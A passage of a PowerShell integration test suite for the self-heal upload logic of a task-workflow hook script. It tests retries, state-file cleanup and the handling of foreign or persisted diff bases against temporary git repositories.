        Write-Host "  FAIL: 9d: state file leaked a credential or URL: $stateD" -ForegroundColor Red
        $script:FAIL++
    } else {
        Write-Host "  PASS: 9d: state file carries no token or URL" -ForegroundColor Green
        $script:PASS++
    }
} finally {
    if ($shJobD -and $shJobD.State -eq 'Running') {
        Stop-Job $shJobD -ErrorAction SilentlyContinue
        Remove-Job $shJobD -Force -ErrorAction SilentlyContinue
    }
}

# 9e: before_review retries when NO state file exists — the PUT arrives and
# the outcome is recorded (mirrors 13c).
$shProjE = New-SelfHealProject -Name 'sh-retry-missing' -StrideMd @'
## before_review
```bash
echo "br_ran"
```
'@
$shPortE = 18891
$shFixtureE = Join-Path $TmpDir 'sh-fixture-e.jsonl'
if (Test-Path $shFixtureE) { Remove-Item -Force $shFixtureE }
$shJobE = Start-PutListener -Port $shPortE -Fixture $shFixtureE -Count 1
try {
    $null = Wait-ForListener -Port $shPortE
    $shJsonE = @{ tool_input = @{ command = "curl -X PATCH http://localhost:$shPortE/api/tasks/99/complete -H `"Authorization: Bearer tok`"" } } | ConvertTo-Json -Compress
    $r = Invoke-HookScript -InputJson $shJsonE -Phase 'post' -ProjectDir $shProjE
    Assert-Exit "9e: before_review with missing state exits 0" 0 $r.ExitCode
    Wait-Job $shJobE -Timeout 8 | Out-Null
    Remove-Job $shJobE -Force -ErrorAction SilentlyContinue
    if (Test-Path $shFixtureE) {
        $recE = Get-Content -Raw -Path $shFixtureE | ConvertFrom-Json
        Assert-Eq "9e: retry PUT method" "PUT" $recE.Method
        Assert-Contains "9e: retry PUT targets /changed_files" "/api/tasks/99/changed_files" $recE.Path
    } else {
        Write-Host "  FAIL: 9e: no retry PUT arrived for missing state" -ForegroundColor Red
        $script:FAIL++
    }
    $stateE = Get-Content -Raw -Path (Join-Path $shProjE '.stride-diff-upload-state') -ErrorAction SilentlyContinue
    Assert-Contains "9e: retry outcome recorded" "http_code=200" $stateE
} finally {
    if ($shJobE -and $shJobE.State -eq 'Running') {
        Stop-Job $shJobE -ErrorAction SilentlyContinue
        Remove-Job $shJobE -Force -ErrorAction SilentlyContinue
    }
}

# 9f: no re-upload on a healthy 2xx for the current task (mirrors 13d) —
# with an unreachable URL an attempted retry would warn and rewrite the
# state to 000; a healthy skip leaves both untouched.
$shProjF = New-SelfHealProject -Name 'sh-healthy' -StrideMd @'
## before_review
```bash
echo "br_ran"
```
'@
Set-Content -Path (Join-Path $shProjF '.stride-diff-upload-state') `
    -Value "task_id=99`nhttp_code=200" -Encoding UTF8
$r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjF
Assert-Exit "9f: healthy-state before_review exits 0" 0 $r.ExitCode
Assert-NotContains "9f: no retry attempted on recorded 2xx" "changed_files upload failed" $r.Stderr
$stateF = Get-Content -Raw -Path (Join-Path $shProjF '.stride-diff-upload-state') -ErrorAction SilentlyContinue
Assert-Contains "9f: healthy state left untouched" "http_code=200" $stateF

# 9g: retry on a state naming a DIFFERENT task id, and on a recorded
# non-2xx (mirrors 13e/13f) — the unreachable URL records the attempt
# as 000 and warns.
$shProjG = New-SelfHealProject -Name 'sh-stale-id' -StrideMd @'
## before_review
```bash
echo "br_ran"
```
'@
Set-Content -Path (Join-Path $shProjG '.stride-diff-upload-state') `
    -Value "task_id=88`nhttp_code=200" -Encoding UTF8
$r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjG
Assert-Contains "9g: stale task id triggers the retry (warning emitted)" "changed_files upload failed" $r.Stderr
$stateG = Get-Content -Raw -Path (Join-Path $shProjG '.stride-diff-upload-state') -ErrorAction SilentlyContinue
Assert-Contains "9g: state rewritten for the current task" "task_id=99" $stateG

$shProjG2 = New-SelfHealProject -Name 'sh-non2xx' -StrideMd @'
## before_review
```bash
echo "br_ran"
```
'@
Set-Content -Path (Join-Path $shProjG2 '.stride-diff-upload-state') `
    -Value "task_id=99`nhttp_code=503" -Encoding UTF8
$r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjG2
Assert-Contains "9g: recorded non-2xx triggers the retry (warning emitted)" "changed_files upload failed" $r.Stderr
Assert-Exit "9g: failed retry never fails the before_review hook" 0 $r.ExitCode

# 9h: claim refresh removes the previous task's snapshot and upload state
# (mirrors 13h and the bash claim-refresh rm sites).
$shProjH = Join-Path $TmpDir 'sh-claim-cleanup'
New-Item -ItemType Directory -Path $shProjH -Force | Out-Null
Set-Content -Path (Join-Path $shProjH '.stride.md') -Value @'
## before_doing
```bash
echo "claimed"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $shProjH '.stride-changed-files.json') `
    -Value '[{"path":"stale.txt","diff":"old"}]' -Encoding UTF8
Set-Content -Path (Join-Path $shProjH '.stride-diff-upload-state') `
    -Value "task_id=88`nhttp_code=200" -Encoding UTF8
$shClaimJson = @{
    tool_input = @{ command = 'curl -X POST https://stridelikeaboss.com/api/tasks/claim' }
    tool_response = '{"data":{"id":42,"identifier":"W42","title":"T","status":"in_progress","complexity":"small","priority":"low"}}'
} | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $shClaimJson -Phase 'post' -ProjectDir $shProjH
Assert-Exit "9h: claim refresh exits 0" 0 $r.ExitCode
if (-not (Test-Path (Join-Path $shProjH '.stride-diff-upload-state'))) {
    Write-Host "  PASS: 9h: claim refresh removes the previous task's upload state" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9h: stale upload state survived the claim refresh" -ForegroundColor Red
    $script:FAIL++
}
if (-not (Test-Path (Join-Path $shProjH '.stride-changed-files.json'))) {
    Write-Host "  PASS: 9h: claim refresh removes the previous task's snapshot" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9h: stale snapshot survived the claim refresh" -ForegroundColor Red
    $script:FAIL++
}

# 9i: after_review cleanup removes the snapshot and upload state
# (mirrors 13i).
$shProjI = Join-Path $TmpDir 'sh-review-cleanup'
New-Item -ItemType Directory -Path $shProjI -Force | Out-Null
Set-Content -Path (Join-Path $shProjI '.stride.md') -Value @'
## after_review
```bash
echo "reviewed"
```
'@ -Encoding UTF8
Set-Content -Path (Join-Path $shProjI '.stride-changed-files.json') `
    -Value '[{"path":"stale.txt","diff":"old"}]' -Encoding UTF8
Set-Content -Path (Join-Path $shProjI '.stride-diff-upload-state') `
    -Value "task_id=99`nhttp_code=200" -Encoding UTF8
$shReviewJson = @{ tool_input = @{ command = 'curl -X PATCH https://stridelikeaboss.com/api/tasks/99/mark_reviewed' } } | ConvertTo-Json -Compress
$r = Invoke-HookScript -InputJson $shReviewJson -Phase 'post' -ProjectDir $shProjI
Assert-Exit "9i: after_review cleanup exits 0" 0 $r.ExitCode
if (-not (Test-Path (Join-Path $shProjI '.stride-diff-upload-state'))) {
    Write-Host "  PASS: 9i: after_review cleanup removes the upload state" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9i: upload state survived the after_review cleanup" -ForegroundColor Red
    $script:FAIL++
}
if (-not (Test-Path (Join-Path $shProjI '.stride-changed-files.json'))) {
    Write-Host "  PASS: 9i: after_review cleanup removes the snapshot" -ForegroundColor Green
    $script:PASS++
} else {
    Write-Host "  FAIL: 9i: snapshot survived the after_review cleanup" -ForegroundColor Red
    $script:FAIL++
}

# 9j (W2103/D273): THE FOREIGN-VERDICT GATE, end to end.
# The state file holds ONE task and is truncated on every write, so an
# interleaved completion leaves ANOTHER task's narrowed= line behind. The
# self-heal must not replay it: a foreign 'yes' narrows THIS task's snapshot to
# a commit range that was never computed for it, and the review under-reports.
#
# THIS EXISTS BECAUSE THE FIX HAD NOTHING THAT COULD FALSIFY IT. The gate at
# `if ($stateTask -ne $taskId) { $stateNarrowed = '' }` shipped with no
# assertion anywhere in the suite - deleting the line left every case green,
# which is the third consecutive round in which a correct change was unpinned.
# Group 25's cases exercise the resolver and the replay as units and never call
# Invoke-SelfHealChangedFilesUpload, so only an integration case can reach it.
#
# The geometry is chosen so the two answers DIVERGE OBSERVABLY. With the gate,
# the foreign verdict is dropped, nothing is on record for this task, and the
# replay falls through to a live check that finds no other open window - so
# nothing is narrowed and the wide snapshot still carries a.txt. Without it,
# the foreign 'yes' is replayed, the owned set resolves to b's commit alone,
# and a.txt disappears from the diff the reviewer would have seen.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9j: the foreign-verdict gate needs git" -ForegroundColor Yellow
} else {
    $shProjJ = Join-Path $TmpDir 'sh-foreign-verdict'
    New-Item -ItemType Directory -Path $shProjJ -Force | Out-Null
    & git -C $shProjJ init -q 2>$null | Out-Null
    & git -C $shProjJ config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $shProjJ config user.name 'Test' 2>$null | Out-Null
    & git -C $shProjJ config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjJ '.gitignore') `
        -Value "/.stride.md`n/.stride-env-cache`n/.stride-changed-files.json`n/.stride-diff-upload-state" -Encoding UTF8
    Set-Content -Path (Join-Path $shProjJ 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $shProjJ add -A 2>$null | Out-Null
    & git -C $shProjJ commit -q -m 'seed' 2>$null | Out-Null
    $shBaseJ = (& git -C $shProjJ rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path (Join-Path $shProjJ 'a.txt') -Value 'a' -Encoding UTF8
    & git -C $shProjJ add -A 2>$null | Out-Null
    & git -C $shProjJ commit -q -m 'a' 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjJ 'b.txt') -Value 'b' -Encoding UTF8
    & git -C $shProjJ add -A 2>$null | Out-Null
    & git -C $shProjJ commit -q -m 'b' 2>$null | Out-Null
    $shOwnedJ = (& git -C $shProjJ rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path (Join-Path $shProjJ '.stride.md') -Value @'
## before_review
```bash
echo "br_ran"
```
'@ -Encoding UTF8
    # The owned set names b's commit ONLY, so a replayed 'yes' is observable as
    # a.txt vanishing rather than as a bare flag change.
    Set-Content -Path (Join-Path $shProjJ '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_ID='99'",
        "TASK_BASE_REF_99='$shBaseJ'",
        "TASK_OWNED_99='$shOwnedJ'")
    # task_id=88, NOT 99: another task's completion landed in the gap. No
    # snapshot on disk, so the self-heal takes the build path where the replay
    # lives; a recorded non-2xx is what makes it retry at all.
    Set-Content -Path (Join-Path $shProjJ '.stride-diff-upload-state') `
        -Value "task_id=88`nhttp_code=500`nnarrowed=yes" -Encoding UTF8
    Remove-Item -Force (Join-Path $shProjJ '.stride-changed-files.json') -ErrorAction SilentlyContinue
    $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjJ
    Assert-Exit "9j: before_review over a foreign verdict exits 0" 0 $r.ExitCode
    $stateJ = @(Get-Content -Path (Join-Path $shProjJ '.stride-diff-upload-state') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9j (D273): a foreign narrowed=yes is NOT replayed into the state file" "0" `
        "$(@($stateJ | Where-Object { $_ -eq 'narrowed=yes' }).Count)"
    Assert-Eq "9j (D273): the state records the verdict actually applied" "1" `
        "$(@($stateJ | Where-Object { $_ -eq 'narrowed=no' }).Count)"
    $cacheJ = @(Get-Content -Path (Join-Path $shProjJ '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9j (D273): and the durable per-task record agrees with it" "1" `
        "$(@($cacheJ | Where-Object { $_ -eq "TASK_NARROWED_99='no'" }).Count)"
    # The behaviour, not just the flag: replaying the foreign verdict would
    # narrow the upload to b's commit and drop a.txt from the review.
    $snapJ = Get-Content -Raw -Path (Join-Path $shProjJ '.stride-changed-files.json') -ErrorAction SilentlyContinue
    Assert-Contains "9j (D273): the snapshot is NOT narrowed by a verdict that was never this task's" `
        'a.txt' "$snapJ"
}

# 9k (W2103/D273): a REFUSED base records the verdict it applied, not the one
# it replayed.
# bash initialises _retry_narrowed=no outside every branch and writes BOTH
# carriers unconditionally. This port initialised it INSIDE the non-refused
# branch, so a refusal carried the replayed value into the state file and never
# touched the per-task record at all - a record claiming 'yes' over a snapshot
# that is '[]', which is narrowed by nothing. The two carriers could then
# disagree with each other AND with the upload.
#
# Own task id on the state line this time, so the D226 refusal is the ONLY thing
# under test here and the 9j gate is not doing the work.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9k: the refusal path needs git" -ForegroundColor Yellow
} else {
    $shProjK = Join-Path $TmpDir 'sh-refused-verdict'
    New-Item -ItemType Directory -Path $shProjK -Force | Out-Null
    & git -C $shProjK init -q 2>$null | Out-Null
    & git -C $shProjK config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $shProjK config user.name 'Test' 2>$null | Out-Null
    & git -C $shProjK config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjK 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $shProjK add -A 2>$null | Out-Null
    & git -C $shProjK commit -q -m 'seed' 2>$null | Out-Null
    $shHeadK = (& git -C $shProjK rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path (Join-Path $shProjK '.stride.md') -Value @'
## before_review
```bash
echo "br_ran"
```
'@ -Encoding UTF8
    # No per-task base, and the SHARED base is stamped as another task's - the
    # D226 foreign-owner refusal.
    Set-Content -Path (Join-Path $shProjK '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_ID='99'",
        "TASK_BASE_REF='$shHeadK'",
        "TASK_BASE_REF_OWNER='88'")
    Set-Content -Path (Join-Path $shProjK '.stride-diff-upload-state') `
        -Value "task_id=99`nhttp_code=500`nnarrowed=yes" -Encoding UTF8
    Remove-Item -Force (Join-Path $shProjK '.stride-changed-files.json') -ErrorAction SilentlyContinue
    $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjK
    Assert-Exit "9k: before_review over a refused base exits 0" 0 $r.ExitCode
    $snapK = Get-Content -Raw -Path (Join-Path $shProjK '.stride-changed-files.json') -ErrorAction SilentlyContinue
    # GEOMETRY CONTROL, not a verdict assertion: it proves the fixture really
    # took the refusal path, which is what makes the three below mean anything.
    # It does not move under any mutation of the verdict logic, and is not
    # meant to.
    #
    # ASSERTED ON THE REFUSAL'S OWN EVIDENCE, not on '[]'. This repo has one
    # commit and a clean tree, so a build that did NOT refuse would resolve
    # base=HEAD, diff HEAD..HEAD and produce '[]' as well - the empty snapshot
    # cannot tell the two apart, and a future fixture edit that quietly stopped
    # the refusal firing would leave every assertion here green over a case
    # testing nothing it names. That is the fixture-drift hazard round 1 found
    # in 25c. This string comes from Resolve-TaskSnapshotBase's foreign-owner
    # branch and from nowhere else.
    Assert-Contains "9k (D226): CONTROL - the foreign-owner refusal really fired" `
        "REFUSING the changed_files diff for task 99" $r.Stderr
    Assert-Contains "9k (D226): the refusal uploads an empty snapshot" '[]' "$snapK"
    $stateK = @(Get-Content -Path (Join-Path $shProjK '.stride-diff-upload-state') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9k (D273): the refusal records 'no', not the replayed 'yes'" "1" `
        "$(@($stateK | Where-Object { $_ -eq 'narrowed=no' }).Count)"
    Assert-Eq "9k (D273): so no stale 'yes' survives the retry's own write" "0" `
        "$(@($stateK | Where-Object { $_ -eq 'narrowed=yes' }).Count)"
    $cacheK2 = @(Get-Content -Path (Join-Path $shProjK '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9k (D273): and the durable record is written on the refusal path too" "1" `
        "$(@($cacheK2 | Where-Object { $_ -eq "TASK_NARROWED_99='no'" }).Count)"
}

# 9k2 (harness): the child does NOT inherit this process's task state.
# Invoke-HookScript's strip is a harness guard, so nothing else in the suite can
# fail when it breaks - and a harness guard that fails silently is worse than
# none, because it makes every case depending on it look green. This is the
# direct pin: 9k's refusal fires only while task 99 has no base of its OWN, and
# Get-TaskBaseRefFor reads the ENVIRONMENT rather than the cache, so a leaked
# TASK_BASE_REF_99 in this process is enough to stop it. With the strip in place
# the refusal still fires; without it, it does not.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9k2: needs git" -ForegroundColor Yellow
} else {
    # RESET FIRST. 9k's own run left a '[]' snapshot and an http_code=000 state
    # on disk, and with a snapshot present the self-heal takes the ordinary
    # retry path and never resolves a base at all - so the refusal it looks for
    # could not fire for a reason having nothing to do with the guard. Draft one
    # of this case failed exactly that way, which is the same class of mistake
    # as the fixture drift 9k's own control now covers.
    function Reset-9k2Fixture {
        Remove-Item -Force (Join-Path $shProjK '.stride-changed-files.json') -ErrorAction SilentlyContinue
        Set-Content -Path (Join-Path $shProjK '.stride-diff-upload-state') `
            -Value "task_id=99`nhttp_code=500`nnarrowed=yes" -Encoding UTF8
    }
    [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_99', 'abc123', 'Process')
    try {
        Reset-9k2Fixture
        $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjK
        Assert-Contains "9k2 (harness): a leaked TASK_BASE_REF_99 does not reach the hook child" `
            "REFUSING the changed_files diff for task 99" $r.Stderr
        # And the opt-out really opts in, so the switch is not decorative - and
        # this leg doubles as the proof that the leg above is not passing for
        # some reason other than the strip.
        Reset-9k2Fixture
        $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjK -InheritTaskEnv
        Assert-NotContains "9k2 (harness): -InheritTaskEnv passes it through, as documented" `
            "REFUSING the changed_files diff for task 99" $r.Stderr
    } finally {
        [System.Environment]::SetEnvironmentVariable('TASK_BASE_REF_99', $null, 'Process')
    }
}

# 9n (W2103/D142): the PERSISTED base wins over re-resolving, AND the trust
# guard is deliberately not re-run on it.
# bash's self-heal takes _state_base when the state file names THIS task and
# only otherwise calls select_task_snapshot_base, so the refusal is reachable
# only when no base is on record. This port re-resolved unconditionally, which
# re-judges against origin refs the after_doing section's own `git push` may
# have moved: a correct base then looks stale and recomputes to HEAD, i.e. an
# EMPTY snapshot (D142). It also meant a refusal could coexist with a persisted
# base on disk - a state bash cannot reach - and the two executors share this
# file.
#
# THE FIXTURE HAS AN ORIGIN, and that is the whole point of its shape. Without
# one, Resolve-SnapshotBaseTrust returns its argument unchanged at the
# no-remote-head branch, so it is a NO-OP in every ps1 test - and adding it back
# onto the persisted branch, which is precisely the D142 emptying this round's
# change exists to prevent, left all 901 assertions green. No fixture in this
# file had ever created a remote. This one does, so the guard is live and the
# decision to skip it is observable.
#
# Geometry: origin/main is at B, HEAD is at C, and the persisted base is A -
# older than the branch point. Skipping the guard keeps A, so B's file is in the
# diff. Applying it recomputes A to the branch point B, and B's file vanishes.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9n: the persisted-base preference needs git" -ForegroundColor Yellow
} else {
    $shProjN = Join-Path $TmpDir 'sh-persisted-base'
    New-Item -ItemType Directory -Path $shProjN -Force | Out-Null
    & git -C $shProjN init -q 2>$null | Out-Null
    & git -C $shProjN config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $shProjN config user.name 'Test' 2>$null | Out-Null
    & git -C $shProjN config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjN '.gitignore') `
        -Value "/.stride.md`n/.stride-env-cache`n/.stride-changed-files.json`n/.stride-diff-upload-state" -Encoding UTF8
    Set-Content -Path (Join-Path $shProjN 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $shProjN add -A 2>$null | Out-Null
    & git -C $shProjN commit -q -m 'A seed' 2>$null | Out-Null
    $shBaseN = (& git -C $shProjN rev-parse HEAD 2>$null | Out-String).Trim()
    # B: pushed, so it becomes the branch point the trust guard would snap to.
    Set-Content -Path (Join-Path $shProjN 'pre-branchpoint.txt') -Value 'pushed work' -Encoding UTF8
    & git -C $shProjN add -A 2>$null | Out-Null
    & git -C $shProjN commit -q -m 'B pushed' 2>$null | Out-Null
    $shPushedN = (& git -C $shProjN rev-parse HEAD 2>$null | Out-String).Trim()
    # The remote is built by pushing rather than by cloning: `git clone -b` and
    # `git init -b` both need a git new enough to name the initial branch, and
    # the branch name is the one thing this fixture cannot afford to have vary.
    $shOriginN = Join-Path $TmpDir 'sh-persisted-base-origin.git'
    & git init --bare -q $shOriginN 2>$null | Out-Null
    & git -C $shProjN remote add origin $shOriginN 2>$null | Out-Null
    & git -C $shProjN push -q origin HEAD:refs/heads/main 2>$null | Out-Null
    & git -C $shProjN fetch -q origin 2>$null | Out-Null
    # C: local only, so merge-base(HEAD, origin/main) is B.
    Set-Content -Path (Join-Path $shProjN 'persisted-work.txt') -Value 'local work' -Encoding UTF8
    & git -C $shProjN add -A 2>$null | Out-Null
    & git -C $shProjN commit -q -m 'C local' 2>$null | Out-Null
    $shHeadN = (& git -C $shProjN rev-parse HEAD 2>$null | Out-String).Trim()
    # CONTROL: the fixture only means anything if the remote really resolves and
    # the branch point really is B. A fixture that quietly stopped having an
    # origin would make the guard a no-op again and every assertion below would
    # pass over the thing it exists to catch - the drift 9k's own control covers.
    $shRemoteN = (& git -C $shProjN rev-parse --verify --quiet 'origin/main' 2>$null | Out-String).Trim()
    $shBpN = (& git -C $shProjN merge-base HEAD 'origin/main' 2>$null | Out-String).Trim()
    Assert-Eq "9n: CONTROL - origin/main resolves, so the trust guard is LIVE here" "True" `
        "$([bool]$shRemoteN)"
    # ASSERTED POSITIVELY, against B's own sha. The first version asserted the
    # NEGATIVE - branch point is not A - which passes when merge-base cannot run
    # at all and returns '', i.e. over the very drift it names: with the
    # fixture's push/fetch deleted, CONTROL 1 failed and this one passed. A
    # control that survives the absence of the thing it controls for is the
    # shape this task has now found seven times.
    Assert-Eq "9n: CONTROL - and the branch point is B, the pushed commit" $shPushedN "$shBpN"
    Set-Content -Path (Join-Path $shProjN '.stride.md') -Value @'
## before_review
```bash
echo "br_ran"
```
'@ -Encoding UTF8
    # No per-task base, and a FOREIGN owner on the shared one, so the selector
    # would refuse. No TASK_BASE_REF_TRUSTED, so the guard is not short-circuited.
    Set-Content -Path (Join-Path $shProjN '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_ID='99'",
        "TASK_BASE_REF='$shHeadN'",
        "TASK_BASE_REF_OWNER='88'")
    Set-Content -Path (Join-Path $shProjN '.stride-diff-upload-state') `
        -Value "task_id=99`nhttp_code=500`nbase=$shBaseN" -Encoding UTF8
    Remove-Item -Force (Join-Path $shProjN '.stride-changed-files.json') -ErrorAction SilentlyContinue
    $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjN
    Assert-Exit "9n: before_review over a persisted base exits 0" 0 $r.ExitCode
    Assert-NotContains "9n (D226): the persisted base is this task's own, so nothing is refused" `
        "REFUSING the changed_files diff for task 99" $r.Stderr
    $snapN = Get-Content -Raw -Path (Join-Path $shProjN '.stride-changed-files.json') -ErrorAction SilentlyContinue
    Assert-Contains "9n (D142): the retry captures from the PERSISTED base" 'persisted-work.txt' "$snapN"
    Assert-Contains "9n (D142): the trust guard is NOT re-run on it - B's file survives" `
        'pre-branchpoint.txt' "$snapN"
    $stateN = @(Get-Content -Path (Join-Path $shProjN '.stride-diff-upload-state') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9n: and the record survives its own truncating write" "1" `
        "$(@($stateN | Where-Object { $_ -eq "base=$shBaseN" }).Count)"
}

# 9l (W2103/D273): the replay's POSITIVE direction, and its only production
# consumer.
# 9j pins that the self-heal does NOT narrow when it must not. Nothing pinned
# that it DOES narrow when it must - and that is the direction whose failure is
# an UNDER-report, the defect D255 and D273 exist to prevent. The consumer is
# the owned-set override in Invoke-SelfHealChangedFilesUpload, which round 1
# rewired from the process-local $script:SnapOwnedRecorded (always $false here,
# because the self-heal runs in a DIFFERENT PROCESS from the capture) to the
# durable Get-TaskOwnedRecord. All three ways of breaking that - reverting to
# the script variable, deleting the override outright, or hard-coding the
# replay decision to $false - left the whole suite green.
#
# Identical to 9j but for ONE byte of fixture: task_id=99 on the state line, so
# the recorded 'yes' is this task's OWN. The geometry then inverts - a.txt must
# be ABSENT, because the owned set names b's commit alone.
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9l: the replay's positive direction needs git" -ForegroundColor Yellow
} else {
    $shProjL = Join-Path $TmpDir 'sh-own-verdict'
    New-Item -ItemType Directory -Path $shProjL -Force | Out-Null
    & git -C $shProjL init -q 2>$null | Out-Null
    & git -C $shProjL config user.email 'test@test.local' 2>$null | Out-Null
    & git -C $shProjL config user.name 'Test' 2>$null | Out-Null
    & git -C $shProjL config commit.gpgsign false 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjL '.gitignore') `
        -Value "/.stride.md`n/.stride-env-cache`n/.stride-changed-files.json`n/.stride-diff-upload-state" -Encoding UTF8
    Set-Content -Path (Join-Path $shProjL 'seed.txt') -Value 'seed' -Encoding UTF8
    & git -C $shProjL add -A 2>$null | Out-Null
    & git -C $shProjL commit -q -m 'seed' 2>$null | Out-Null
    $shBaseL = (& git -C $shProjL rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path (Join-Path $shProjL 'a.txt') -Value 'a' -Encoding UTF8
    & git -C $shProjL add -A 2>$null | Out-Null
    & git -C $shProjL commit -q -m 'a' 2>$null | Out-Null
    Set-Content -Path (Join-Path $shProjL 'b.txt') -Value 'b' -Encoding UTF8
    & git -C $shProjL add -A 2>$null | Out-Null
    & git -C $shProjL commit -q -m 'b' 2>$null | Out-Null
    $shOwnedL = (& git -C $shProjL rev-parse HEAD 2>$null | Out-String).Trim()
    Set-Content -Path (Join-Path $shProjL '.stride.md') -Value @'
## before_review
```bash
echo "br_ran"
```
'@ -Encoding UTF8
    Set-Content -Path (Join-Path $shProjL '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_ID='99'",
        "TASK_BASE_REF_99='$shBaseL'",
        "TASK_OWNED_99='$shOwnedL'")
    Set-Content -Path (Join-Path $shProjL '.stride-diff-upload-state') `
        -Value "task_id=99`nhttp_code=500`nnarrowed=yes" -Encoding UTF8
    Remove-Item -Force (Join-Path $shProjL '.stride-changed-files.json') -ErrorAction SilentlyContinue
    $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjL
    Assert-Exit "9l: before_review over this task's own verdict exits 0" 0 $r.ExitCode
    $snapL = Get-Content -Raw -Path (Join-Path $shProjL '.stride-changed-files.json') -ErrorAction SilentlyContinue
    # THE CONSUMER. Without the owned-set override the retry uploads base..HEAD
    # and a.txt - another task's commit - rides along in this task's review.
    Assert-Contains "9l (D255): the retry narrows to the owned commit" 'b.txt' "$snapL"
    Assert-Eq "9l (D255): so a commit this task does not own is NOT in the snapshot" "0" `
        "$(@(@($snapL -split "`n") | Where-Object { $_ -match 'a\.txt' }).Count)"
    $stateL = @(Get-Content -Path (Join-Path $shProjL '.stride-diff-upload-state') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9l (D273): and the APPLIED verdict recorded is 'yes'" "1" `
        "$(@($stateL | Where-Object { $_ -eq 'narrowed=yes' }).Count)"
    $cacheL = @(Get-Content -Path (Join-Path $shProjL '.stride-env-cache') -Encoding UTF8 -ErrorAction SilentlyContinue)
    Assert-Eq "9l (D273): on the durable carrier too" "1" `
        "$(@($cacheL | Where-Object { $_ -eq "TASK_NARROWED_99='yes'" }).Count)"
}

# 9m (W2103): the ORDINARY RETRY carries the persisted base through its own
# truncating write - and only this task's.
# The retry's state write TRUNCATES the file. On the path where a snapshot is
# already on disk nothing recomputes a base, so seeding $healBase with '' would
# not "leave the record alone" - it would DELETE the base the primary capture
# persisted. Inert on this side (nothing here reads base= as a revision) but not
# across executors: bash PREFERS the persisted base over re-resolving, because
# re-resolving after the section's own `git push` can make a correct base look
# stale and recompute to HEAD, i.e. an empty snapshot (D142).
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "  SKIP: 9m: the base carry needs git" -ForegroundColor Yellow
} else {
    foreach ($g9m in @(
        @{ Name = 'own';     StateTask = '99'; Survives = $true },
        @{ Name = 'foreign'; StateTask = '88'; Survives = $false }
    )) {
        $shProjM = New-SelfHealProject -Name "sh-base-carry-$($g9m.Name)" -StrideMd @'
## before_review
```bash
echo "br_ran"
```
'@
        # New-SelfHealProject leaves a snapshot on disk, which is exactly the
        # path under test: the retry re-uploads it and never rebuilds.
        Set-Content -Path (Join-Path $shProjM '.stride-diff-upload-state') `
            -Value "task_id=$($g9m.StateTask)`nhttp_code=500`nbase=cafed00d`nnarrowed=no" -Encoding UTF8
        $r = Invoke-HookScript -InputJson $shUnreachableJson -Phase 'post' -ProjectDir $shProjM
        Assert-Exit "9m ($($g9m.Name)): the retry exits 0" 0 $r.ExitCode
        $stateM = @(Get-Content -Path (Join-Path $shProjM '.stride-diff-upload-state') -Encoding UTF8 -ErrorAction SilentlyContinue)
        $expect = if ($g9m.Survives) { "1" } else { "0" }
        Assert-Eq "9m ($($g9m.Name)): base=cafed00d survives the truncating write: $expect" $expect `
            "$(@($stateM | Where-Object { $_ -eq 'base=cafed00d' }).Count)"
    }
}

# ============================================================
# Test Group 10: claim-time TASK_BASE_REF refresh + persisted-output
# fallback (W1087, mirrors test-stride-hook.sh Test Group 14 test-for-test)
# ============================================================
# A claim always opens a new task window. The hook must refresh TASK_BASE_REF
# to current HEAD on every claim: from parseable stdout, from a persisted output
# file when stdout only carries a "saved to" notice, and — when no JSON is
# obtainable at all — by rewriting only the TASK_BASE_REF line while preserving
# existing TASK_ identity lines. Non-claim hooks never touch it.
Write-Host ""
